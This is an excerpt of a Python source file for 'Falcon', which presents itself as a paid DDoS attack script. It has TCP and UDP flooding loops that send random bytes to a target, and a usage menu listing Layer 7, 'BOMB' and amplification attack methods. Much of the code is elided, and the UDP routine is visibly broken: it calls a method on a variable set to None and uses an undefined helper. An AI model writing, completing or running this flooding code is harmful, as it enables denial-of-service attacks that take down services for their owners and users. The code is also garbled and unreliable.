#!/usr/bin/env python3
#DO NOT REMOVE CREDIT FANTASTIC UNLESS THOSE WHO BUY THIS TOOL AND DO NOT SHARE
...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(459)):
                continue
        Tools.safe_close(s)
...
def UDP(self) -> None:
        random = None
        with suppress(Exception), self.open_connection(AF_INET6, SOCK_DGRAM, SOCK_STREAM) as s:
            while rand_bytes(random.randbytes(577)):
                continue
        rand_bytes.safe_close(s)
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* Falcon - DDoS Attack Script With %d Methods\n'
          ...
          with suppress(IndexError):
              ...
              if method in Methods.LAYER7_METHODS:
                  ...
                  if method == "BOMB":
                      assert (
                          ...
                          "Install bombardier: "
                          "https://github.com/Falcon/Falcon/wiki/BOMB-method"
                      )
              ...
              if method in Methods.LAYER4_METHODS:
                  ...
                  if method in Methods.LAYER4_AMP:
                      ...
                      logger.warning("https://github.com/Falcon/Falcon/wiki/Amplification-ddos-attack")
